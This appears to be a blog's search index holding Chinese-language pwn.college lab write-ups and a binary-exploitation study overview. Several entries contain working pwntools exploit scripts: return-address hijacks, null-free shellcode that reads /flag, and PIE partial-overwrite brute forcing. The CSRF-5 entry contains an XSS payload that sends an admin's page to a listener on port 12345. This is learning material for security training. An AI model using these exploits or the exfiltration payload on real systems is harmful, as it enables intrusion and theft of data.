<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Control-Hijack</title>
    <link href="/2025/07/20/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/"/>
    <url>/2025/07/20/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>需要我们劫持函数的控制流，但具体劫持到哪，需要反汇编整个程序来决定</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先将&#x2F;challenge下的二进制文件下载到本地，拖到IDA里看一下，（F5反编译，即看C伪代码）<br><br>个人习惯首先观察main函数<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/main.png"><br>可以看到main调用了challenge，并且main里面没有发现溢出点，那只能进challenge里看一下<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/challenge.png"><br>很好，在challenge中找到了溢出点read，给了4096个字节，但缓冲区只有14个字节，完全够覆盖到返回地址<br><br>同时，观察左侧函数名一栏存在一个win函数，点进去看一下，发现是输出flag的功能，如图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/win.png"><br>至此，漏洞点就清晰了，我们需要覆盖返回地址为win函数的地址，劫持challenge函数的控制流</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定缓冲区到返回地址的偏移，注意challenge函数反编译的截图，在第5行buf变量后面有一个[rbp-80H]的字段，联系栈帧结构，可以知道返回地址在缓冲区的高0x80+0x8&#x3D;136字节处<br><br>之后确定win函数地址，首先checksec命令查看程序开启了哪些保护<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">checksec /challenge/binary-exploitation-control-hijack<br></code></pre></td></tr></table></figure><p>如下图，发现没有开启PIE，说明程序每次会被加载到固定的基地址（0x400000）<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/checksec.png"><br>因此采用objdump命令进行反汇编，直接拿到win的地址<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d /challenge/binary-exploitation-control-hijack<br></code></pre></td></tr></table></figure><p><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/objdump.png"><br>可以看到win函数在0x401c20的地方<br><br>因此可以编写出如下利用脚本了<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>ioHandler=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-control-hijack&quot;</span>)<br>offset=<span class="hljs-number">136</span><br>winAddr=<span class="hljs-number">0x401c20</span><br>ioHandler.recvuntil(<span class="hljs-string">&quot;Send your payload (up to 4096 bytes)!\n&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(winAddr)<br>ioHandler.send(payload)<br>flag=ioHandler.recvall().decode()<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>直接运行即可拿到flag了<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NULL-Free-Shellcode</title>
    <link href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/NULL-Free-Shellcode/"/>
    <url>/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/NULL-Free-Shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这道题说了，会将输入的内容当作代码来执行，但是会对输入的内容做一些限制<br></p><span id="more"></span><h1 id="漏洞点分析与利用"><a href="#漏洞点分析与利用" class="headerlink" title="漏洞点分析与利用"></a>漏洞点分析与利用</h1><p>这道题给了源码，也没有什么easy和hard区分，因此主要记录一个trick，即如何清除shellcode里的0x00字节<br><br>漏洞点简单介绍一下，看源代码中，留了4096个字节读取我们的输入，然后执行过滤逻辑，遇到0x00就会退出<br><br>那么如何清除0字节？根据0字节的来源有三种方法：<br><br>1 对寄存器赋值0时会产生0字节，因此避免直接使用mov指令将寄存器清零，而应该使用xor指令<br><br>2 对寄存器赋值一个较小的数字会产生0字节，因此对寄存器赋值时，如果目标值很小，需要采用先把操作数push进栈，再pop出栈到寄存器的方法&lt;br<br>有了上面的理论，就很好构造shellcode了：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.intel_syntax noprefix</span><br><span class="hljs-string">mov r10,0x67616c662f2f2f2f</span><br><span class="hljs-string">shr r10,24</span><br><span class="hljs-string">push r10</span><br><span class="hljs-string">lea rdi,[rsp]</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 2</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi,rax</span><br><span class="hljs-string">sub rsp,100</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">push 100</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=shellcode<br>ioTube=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-null-free-shellcode&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;Reading 0x1000 bytes from stdin.\n&quot;</span>)<br>ioTube.send(payload)<br>response=ioTube.recvall().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;pwn.college&#123;&quot;</span> <span class="hljs-keyword">in</span> response:<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(response)<br></code></pre></td></tr></table></figure><p>解释一下第一行传flag字符串参数为什么要这么写，首先&#x2F;flag只有5个字节，会产生0字节，所以用斜线（即2f）填充，但这样会导致打开文件失败，所以当复制完成后，通过右移指令把多余的2f移丢即可<br></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>String-Lengths-hard</title>
    <link href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/String-Lengths-hard/"/>
    <url>/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/String-Lengths-hard/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这题除了PIE以外，对输入还存在额外的校验，具体是什么需要我们去分析<br></p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先依然是chencksec，可以看到除了cananry全部开启，大概率和PIE的那题一样，需要触发后门函数<br><br>拖到IDA里看一下果不其然，有熟悉的win_authed，并且溢出点在challenge中<br><br>所以漏洞点和PIEs类似，劫持控制流到win函数<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先看objdump看win函数的地址，最后两个字节是0x2142，然后依然是要返回到校验逻辑的后面，选择0x215e<br><br>偷个懒，具体的操作方法就不放图了，可以参考PIE那一题的Wp<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/#more">PIEs-hard题解</a></p><p>之后看偏移地址，IDA里看到最后dest距离rbp0x50个字节，所以offset&#x3D;0x50+0x8&#x3D;88<br><br>注意：这里的buf是malloc申请到的堆上的空间，不能看buf的地址，要从后面memcpy的操作，看出最后是把输入复制到位于栈上的dest处<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/String-Lengths/offset.png"><br>最后，最关键的地方来了，challenge会调用strlen函数对我们的输入长度存在校验，不能超过43，但光垃圾数据填充就要88个，显然不行<br><br>这里卡了很久，直到看到对strlen函数的一个说明:<br><br><em><strong>The strlen() function calculates the length of the string pointed to by s, excluding the terminating null byte (‘\0’).</strong></em><br>翻译一下就是这个函数会计算字符串的长度，直到遇到终止字节，即0x00<br><br>很好，那思路就应该是用0x00作为垃圾数据填充88字节即可，这样一看这题一下子就变得简单了，之前还卡了一个下午<br><br>也算是长了个教训，还是基础不扎实，对这些库函数还是停留在用的层面，不了解深层的实现机制……<br><br>最终的利用脚本如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>offset=<span class="hljs-number">88</span><br>returnAddr=<span class="hljs-number">0x415e</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*offset+p16(returnAddr)<br>    ioTube=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-null-write&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Send your payload (up to 4096 bytes)!\n&quot;</span>)<br>    ioTube.send(payload)<br>    response=ioTube.recv().decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;pwn.college&#123;&quot;</span> <span class="hljs-keyword">in</span> response:<br>        <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(response)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>然后去flag.txt里找就行了<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/String-Lengths/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PIEs-hard</title>
    <link href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/"/>
    <url>/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>程序开启了PIE保护，因此程序每次加载的基地址都是不确定的；我们无法再得知后门函数或者shellcode的真实地址，需要通过爆破的方法拿到shell<br></p><span id="more"></span><p>通过这题记录一个小trick，有关PIE的基础理论在这里<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/TogetherReview/Binary-Exp/#more">二进制利用知识整理</a></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先checksec看一下，发现除了cananry全部保护开启，直接断绝shellcode的念头<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/PIEs/checksec.png"><br>先考虑有没有后门函数，将二进制文件拖入IDA，可以看到有一个win_auth函数，同时溢出点在challenge函数<br><br>这样的话漏洞点就清晰了，就是通过覆盖challenge函数的返回地址来跳转到win_auth即可<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先计算偏移，同样在IDA里看缓冲区相对于rbp的偏移然后+8即可，算出来是120<br><br>接下来通过objdump看到win函数相对于程序装载基地址的偏移&#x3D;0x1ab2<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/PIEs/win_auth.png"><br>但是这里有一个问题，我们不能跳转到0x1ab2，因为win函数入口处存在对参数值的校验，只能跳转到校验逻辑的后面，比如0x1ace<br><br>最后，我们需要覆盖最后一个半字节，爆破剩下的15位十六进制数<br><br>一个小trick，个人习惯把偏移加上个1、2左右，从做的题目来看，这样可以更早撞上（maybe程序装载基地址倒数第4位是0的概率更小？不太确定……），但不管怎么说，碰撞16次以后就有很高的概率可以碰对了<br><br>最后的利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>offset=<span class="hljs-number">120</span><br>returnAddr=<span class="hljs-number">0x2ace</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p16(returnAddr)<br>    ioTube=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-pie-overflow&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Send your payload (up to 4096 bytes)!\n&quot;</span>)<br>    ioTube.send(payload)<br>    response=ioTube.recv().decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;pwn.college&#123;&quot;</span> <span class="hljs-keyword">in</span> response:<br>        <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(response)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>脚本运行完毕后可以在当前目录的flag.txt中找到flag<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/PIEs/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Binary-Exp</title>
    <link href="/2025/07/19/TogetherReview/Binary-Exp/"/>
    <url>/2025/07/19/TogetherReview/Binary-Exp/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这一篇博客会把二进制利用的知识串起来，同时穿插pwn.college的题解，帮助自己理解和巩固。<br></p><span id="more"></span><p>内容会随着博主掌握的内容而更新，目前只到ROP栈迁移部分（基本对应pwn.college上的intro&#x2F;Binary Exploitation的全部以及program security&#x2F;ROP的level1-9），当然博主也是新手，有写错的地方勿怪<br><br>（声明：这篇博客所有记录默认是以64位架构为前提）</p><h1 id="基础部分随记"><a href="#基础部分随记" class="headerlink" title="基础部分随记"></a>基础部分随记</h1><h2 id="栈结构与函数调用"><a href="#栈结构与函数调用" class="headerlink" title="栈结构与函数调用"></a>栈结构与函数调用</h2><p>首先个人觉得做二进制的题目，最基本的是需要了解栈结构。<br><br><em><strong>栈的内存空间是从高地址向低地址增长，也就是说，每当有东西进栈，rsp将会-1，每当有东西出栈，rsp将会+1</strong></em><br><br>每个函数在调用的过程中会维护自己的一块在栈上的内存空间，被称为栈帧；<br><br><em><strong>函数在被调用时，首先会进行传参，但是否传入栈上，得看架构和参数个数；比如根据64位系统调用约定，前6个参数依次从rdi、rsi、rdx、rcx、r8、r9中读取，因此当参数个数超过6个，才通过栈传参（当然32位就是全用栈传参）</strong></em><br><em><strong>传参完成后会将下一条指令的地址压栈，即push rip，该地址被称为返回地址，这个动作由call指令自动完成</strong></em><br><br><em><strong>接下来会进入函数的所谓“序言”部分，即执行：压rbp入栈（push rbp）-&gt;把rsp的值赋给rbp（mov rbp,rsp）-&gt;rsp向低地址移动（sub rsp）</strong></em><br><br>（备注：后续回顾时重点理解函数被调用时的进栈流程，和leave ret对应起来理解）<br><br>此时，函数的栈帧已经形成，栈的最高处是调用者的rbp，最低处是rsp，函数运行时的局部变量存在栈帧的靠近低处<br><br>从rbp到局部变量，中间的内容需要具体分析，可能会有canary等数据<br><br>综上，可以画出栈的一个示意图如下：<br><br><img src="/../../../../../../photos/TogetherReview/stack.png"><br>函数调用结束后，一般末尾会有leave和ret指令，这两条指令的等价形式如下：<br><br><em><strong>leave&#x3D;mov rsp,rbp;pop rbp，ret &#x3D;pop rip</strong></em><br><em><strong>此时可以发现，这些操作正好对应着函数序言，即可以理解为序言的反操作，这也就是为什么函数在调用过后还能回到原来的地方继续执行（返回地址实现），同时调用者的栈帧也能恢复（rbp的入栈出栈实现）</strong></em></p><h2 id="缓冲区溢出攻击原理"><a href="#缓冲区溢出攻击原理" class="headerlink" title="缓冲区溢出攻击原理"></a>缓冲区溢出攻击原理</h2><p>分析上述栈结构和函数调用过程，可以发现局部变量（用户输入的缓冲区）是在返回地址下方，而用户输入是不可控的，如果没有长度校验，可以通过构造过长的输入去覆盖返回地址，从而劫持函数的执行流<br><br>最后一个问题：返回地址应该覆盖为什么？根据目前做题经验，总结为以下三类：<br></p><h3 id="后门函数的地址"><a href="#后门函数的地址" class="headerlink" title="后门函数的地址"></a>后门函数的地址</h3><p>后门函数在题目中一般表现为可以读取、输出flag的函数，或者是直接调用system()等可以获得shell的函数<br><br>如果给的二进制文件中存在这类函数（通过逆向等手段发现），可以优先考虑覆盖返回地址为该函数的地址<br></p><h3 id="攻击者自己写的shellcode的起始地址"><a href="#攻击者自己写的shellcode的起始地址" class="headerlink" title="攻击者自己写的shellcode的起始地址"></a>攻击者自己写的shellcode的起始地址</h3><p>shellcode即可以帮助攻击者获取shell的代码，当二进制文件本身不存在后门函数的时候，就需要攻击者自己编写shellcode，并将其溢出到程序内存中（一般是栈上）<br><br>具体实现方法为通过编写汇编语言代码，调用system、execve等函数开启shell。由于python强大的pwn包，现在可以直接使用该模块生成一般的shellcode<br></p><h3 id="攻击者构造的ROP链的起始地址（即链条中第一条指令碎片的地址）"><a href="#攻击者构造的ROP链的起始地址（即链条中第一条指令碎片的地址）" class="headerlink" title="攻击者构造的ROP链的起始地址（即链条中第一条指令碎片的地址）"></a>攻击者构造的ROP链的起始地址（即链条中第一条指令碎片的地址）</h3><p>待补充……</p><h2 id="溢出攻击的防御手段"><a href="#溢出攻击的防御手段" class="headerlink" title="溢出攻击的防御手段"></a>溢出攻击的防御手段</h2><p>目前博主在做题当中遇到的主要会阻碍我们的防御手段就是以下3种（后面遇到了别的再记录）：<br></p><h3 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h3><p>NX保护即指定栈不可执行，该保护主要用于防御直接往栈上写shellcode的攻击方式<br><br>为了克制NX保护，需要采取被称为ROP的代码重用攻击（见后）<br></p><h3 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h3><p>canary即在rbp的下方放置一个随机数，并在安全位置保存该随机数的副本，退栈时比对副本和读取到的随机数，如果不一样说明发生了溢出攻击<br><br>值得一提的是，canary的第一个字节一定是0x00，这是为了截断字符串读取，防止canary泄露而设计，但这种设计也为canary的爆破提供了方便（爆破方法见后）<br></p><h3 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h3><p>PIE全称为位置无关可执行文件，开启了这个保护的程序，每次运行时将被加载到不同的基地址，因此程序里所有的指令地址在运行前都无法确定<br><br>换句话说，通过objdump反汇编看到的指令地址、函数起始地址，都是偏移量，不能直接使用<br><br>但是，由于操作系统需要页对齐，即每页大小4096字节，而4096正好&#x3D;0x1000，因此返回地址的最后12位（或者说最后一个半字节是确定的）<br><br>由此，为了克制PIE，可以采取低字节部分覆盖的攻击方法<br><br>综上，当实际做题时，首要步骤应该是使用checksec命令去检查程序的保护措施，如下图：<br><br><img src="/../../../../../../photos/TogetherReview/checksec-example.png"><br>这个程序是保护全关，但是看到哪种保护开启了，其实也是变相在提示解题思路<br><br>比如看到NX就知道栈上写shellcode的方法肯定废了，应该要ROP，或者有后门函数？看到canary和PIE，想到要爆破，或者想办法泄露有一个基地址？</p><h1 id="题目实例"><a href="#题目实例" class="headerlink" title="题目实例"></a>题目实例</h1><h2 id="基本题目举例"><a href="#基本题目举例" class="headerlink" title="基本题目举例"></a>基本题目举例</h2><h3 id="劫持到后门函数"><a href="#劫持到后门函数" class="headerlink" title="劫持到后门函数"></a>劫持到后门函数</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/">pwn.college题解：Control-Hijack</a></p><h3 id="劫持到shellcode"><a href="#劫持到shellcode" class="headerlink" title="劫持到shellcode"></a>劫持到shellcode</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/18/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/">pwn.college题解：Hijack-to-Shellcode</a></p><h3 id="劫持到ROP链"><a href="#劫持到ROP链" class="headerlink" title="劫持到ROP链"></a>劫持到ROP链</h3><p>待补充……</p><h2 id="一些trick"><a href="#一些trick" class="headerlink" title="一些trick"></a>一些trick</h2><h3 id="克制PIE"><a href="#克制PIE" class="headerlink" title="克制PIE"></a>克制PIE</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/">pwn.college题解：PIEs-hard</a></p><h3 id="消除shellcode的零字节"><a href="#消除shellcode的零字节" class="headerlink" title="消除shellcode的零字节"></a>消除shellcode的零字节</h3><p>具体的题目实例见<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/NULL-Free-Shellcode/">pwn.college题解：NULL-Free-Shellcode</a></p>]]></content>
    
    
    <categories>
      
      <category>串联梳理</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSRF-5</title>
    <link href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-5/"/>
    <url>/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-5/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这一关将不允许通过Javascript获取cookie，因为服务端对cookie设置了HTTPonly属性，该设置仅允许通过http请求传送cookie值，因此XSS将无法再获得admin的cookie<br><br>但是依然可以通过CSRF伪造admin用户的请求以泄露flag</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>依然是admin账户下面有flag，而ephemeral依然接收一个msg查询字符串，所以思路就是利用这个msg把admin导向首页，再把请求体发给我们的服务器</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>如下index.html：<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF Attack<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> targetURL = <span class="hljs-string">&#x27;http://challenge.localhost/ephemeral?msg=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-string">&#x27;&lt;script&gt;fetch(&quot;http://challenge.localhost/&quot;).then(response=&gt;response.text()).then(flag=&gt;fetch(&quot;http://localhost:12345&quot;,&#123;method:&quot;POST&quot;,body:flag&#125;))&lt;\/script&gt;&#x27;</span>);</span><br><span class="language-javascript">       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = targetURL;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>依次启动&#x2F;server、python http.server和victim<br>然后还需要我们再去12345监听admin发回来的响应体，那里面就有flag</p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hijack-to-Shellcode</title>
    <link href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/"/>
    <url>/2025/07/18/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>基础的栈溢出，在&#x2F;challenge目录下仅存在一个ELF文件，无源代码，需要我们构造输入劫持返回地址，根据题目名字能猜到是要劫持到shellcode起始地址</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>分析一个程序首先要分析有没有溢出点，溢出点在哪里。分析方法和上一题一致，这里省略<br><br>接下来用checksec看一下开了哪些保护<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/checksec.png"><br>发现保护全关，因此漏洞点就是缓冲区溢出覆写返回地址，劫持到我们的shellcode<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定偏移量，可以采用和上一题相同的方法，最后计算得到偏移量&#x3D;120<br><br>第二步需要确定返回地址，即我们的shellcode的起始地址是哪，首先很自然想到将shellcode放在返回地址后面<br><br>通过gdb，在challenge函数的ret指令处打下断点，程序将停在ret指令之前，此时再次使用x命令查看$rsp，由于ret本质是进行pop rip操作，因此rsp此时指向的第一个内存格子就是返回地址,如下图<br><br><img 